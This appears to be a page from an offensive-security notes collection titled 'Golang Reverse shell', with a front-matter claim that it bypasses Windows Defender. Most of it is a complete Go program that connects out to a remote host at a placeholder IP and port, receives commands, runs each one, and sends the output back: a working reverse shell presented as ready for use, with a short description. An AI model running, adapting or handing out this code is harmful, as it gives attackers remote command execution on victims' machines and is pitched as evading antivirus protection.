---
description: Bypasses window defender
---

# Golang Reverse shell

The code above creates a socket connection to a remote host at the specified IP address and port number. It then enters a loop where it waits for a command to be sent from the remote host. Once a command is received, it is executed using the `exec.Command()` method, and the output and error messages are sent back to the remote host.

```
package main

import (
	"bufio"       // for reading from the socket
	"net"         // for creating a socket connection
	"os/exec"     // for running commands
	"strings"     // for trimming whitespace from input
	"strconv"     // for converting the port number to a string
)

const (
	REMOTE_HOST = "10.X.X.X" // the IP address of the remote host
	REMOTE_PORT = 4231       // the port to connect to on the remote host
)

func main() {
	// Connect to the remote host
	conn, err := net.Dial("tcp", REMOTE_HOST+":"+strconv.Itoa(REMOTE_PORT))
	if err != nil {
		// If there was an error, panic
		panic(err)
	}
	// Defer closing the connection until the function returns
	defer conn.Close()

	println("Connected to remote host.")

	for {
		println("Awaiting command...")

		// Read a message from the remote host
		message, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			// If there was an error, panic
			panic(err)
		}
		// Trim leading and trailing whitespace from the message
		message = strings.TrimSpace(message)

		println("Running command:", message)
		// Run the command
		cmd := exec.Command(message)
		output, err := cmd.CombinedOutput()
		if err != nil {
			println("Error running command:", err)
		}

		println("Sending response...")
		// Send the output and error messages back to the remote host
		conn.Write(output)
	}
}

```
